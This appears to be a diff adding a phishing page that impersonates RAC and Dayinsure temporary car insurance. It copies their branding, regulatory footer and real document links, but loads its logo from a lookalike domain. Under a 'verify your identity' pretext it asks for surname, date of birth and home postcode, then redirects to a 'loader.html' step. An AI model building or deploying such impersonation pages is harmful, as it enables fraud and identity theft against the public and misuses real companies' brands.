@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Temporary Car Insurance | Short-Term Cover from 1 Hour</title>
+
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+
+    <style>
+        body {
+            font-family: "Segoe UI", system-ui, sans-serif;
+        }
+    </style>
+</head>
+
+<body class="bg-white">
+    <header class="bg-[#FF4D00] text-white py-4">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex justify-between items-center">
+            <img src="https://rac-dayinsurepolicy.com/v9I8dFj.png" alt="Logo" class="h-8 cursor-pointer">
+        </div>
+    </header>
+
+    <main class="flex-1 flex items-center justify-center p-4 bg-white mt-12">
+        <div class="w-full max-w-md">
+            <h1 class="text-3xl font-light mb-6 text-center">Retrieve your information</h1>
+
+            <div class="bg-[#e8e8e8] rounded-lg p-8">
+                <p class="text-gray-600 mb-8">
+                    To protect your personal data, we need to verify information about you, the driver. Please enter
+                    your details below.
+                </p>
+
+                <form class="space-y-6" onsubmit="goToLoader(event)">
+                    <div>
+                        <label class="flex items-center text-gray-700 mb-2">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-user mr-2">
+                                <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path>
+                                <circle cx="12" cy="7" r="4"></circle>
+                            </svg>
+
+                            <span>Surname</span>
+                        </label>
+
+                        <input type="text" placeholder="e.g. Smith"
+                            class="w-full p-3 border rounded-lg border-[#E2E8F0] focus:outline-none focus:ring-2 focus:ring-[#FF4D00] bg-white"
+                            required="" value="">
+                    </div>
+
+                    <div>
+                        <label class="flex items-center text-gray-700 mb-2">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-calendar mr-2">
+                                <path d="M8 2v4"></path>
+                                <path d="M16 2v4"></path>
+                                <rect width="18" height="18" x="3" y="4" rx="2"></rect>
+                                <path d="M3 10h18"></path>
+                            </svg>
+
+                            <span>Date of birth</span>
+                        </label>
+
+                        <div class="flex bg-white rounded-lg border border-[#E2E8F0] overflow-hidden">
+                            <input type="text" placeholder="DD" maxlength="2"
+                                class="w-1/3 p-3 text-center focus:outline-none focus:ring-0 border-r border-[#E2E8F0]"
+                                required="" value="" style="border-right-width: 2px; height: 48px;">
+
+                            <input type="text" placeholder="MM" maxlength="2"
+                                class="w-1/3 p-3 text-center focus:outline-none focus:ring-0 border-r border-[#E2E8F0]"
+                                required="" value="" style="border-right-width: 2px; height: 48px;">
+
+                            <input type="text" placeholder="YYYY" maxlength="4"
+                                class="w-1/3 p-3 text-center focus:outline-none focus:ring-0" required="" value=""
+                                style="height: 48px;">
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="flex items-center text-gray-700 mb-2">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-map-pin mr-2">
+                                <path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"></path>
+                                <circle cx="12" cy="10" r="3"></circle>
+                            </svg>
+                            <span>Home postcode</span>
+                        </label>
+
+                        <input type="text" placeholder="e.g. AB1 2CD"
+                            class="w-full p-3 border border-[#E2E8F0] rounded-lg focus:outline-none focus:ring-2 focus:ring-[#FF4D00] bg-white"
+                            required="" value="">
+                    </div>
+
+                    <button type="submit"
+                        class="w-full bg-[#FF4D00] cursor-pointer text-white py-3 px-4 rounded-lg font-medium hover:bg-[#E64500] transition-colors">
+                        Retrieve information
+                    </button>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <footer class="bg-[#1A1A1A]">
+        <div class="text-center py-8 px-4">
+            <div class="flex flex-col md:flex-row justify-center items-center space-y-4 md:space-y-0 md:space-x-6 mb-8">
+                <a href="https://www.rac.co.uk/" target="_blank" rel="noopener noreferrer"
+                    class="text-white hover:text-gray-300 transition-colors flex items-center">
+                    <span>Go to www.rac.co.uk</span>
+                    <svg class="ml-2 h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path>
+                    </svg>
+                </a>
+
+                <a href="https://diprodsiteresources.blob.core.windows.net/resources/DocumentStore/Underwriter_Aviva/ProductName_Dayinsure.App.RetailQuote/BrandId_1/DocumentType_4/2024-24-11--00-00-00/Dayinsure TOBA v4.9.3 01102024.pdf"
+                    class="text-white hover:text-gray-300 transition-colors" download="">
+                    Terms of Business
+                </a>
+
+                <a href="https://diprodsiteresources.blob.core.windows.net/resources/DocumentStore/Underwriter_Aviva/ProductName_Dayinsure.App.RetailQuote/BrandId_3/DocumentType_19/2024-10-24--00-00-00/RAC Privacy Policy v2.1 16.10.2024.pdf"
+                    class="text-white hover:text-gray-300 transition-colors" download="">
+                    Privacy Policy
+                </a>
+
+                <a href="https://www.dayinsure.com/cookie-policy/"
+                    class="text-white hover:text-gray-300 transition-colors" target="_blank" rel="noopener noreferrer">
+                    Cookie Policy
+                </a>
+            </div>
+
+            <p class="text-xs text-gray-400 max-w-4xl mx-auto">
+                RAC Financial Services Limited act as an introducer to
+                Dayinsure.com Ltd for RAC Day Insurance. RAC Financial Services Limited is registered in England No.
+                5171817. Registered Office: RAC House, Brockhurst Crescent, Walsall WS5 4AW. RAC Day Car Insurance is
+                arranged and administered by Dayinsure.com Ltd, which is registered in England no. 04996289, registered
+                office: Mara House, Tarporley Business Centre, Nantwich Road, Tarporley, Cheshire CW6 9UY. Both
+                companies are authorised and regulated by the Financial Conduct Authority. RAC Day Insurance is
+                underwritten by Aviva Insurance Limited. Registered in Scotland, No 2116. Registered Office: Pitheavlis,
+                Perth PH2 0NH. Aviva Insurance Limited are authorised by the Prudential Regulation Authority and
+                regulated by the Financial Conduct Authority and the Prudential Regulation Authority.
+            </p>
+        </div>
+    </footer>
+
+
+    <script>
+        function goToLoader(e) {
+            e.preventDefault(); 
+            window.location.href = "loader.html";
+        }
+    </script>
+</body>
+
+</html>
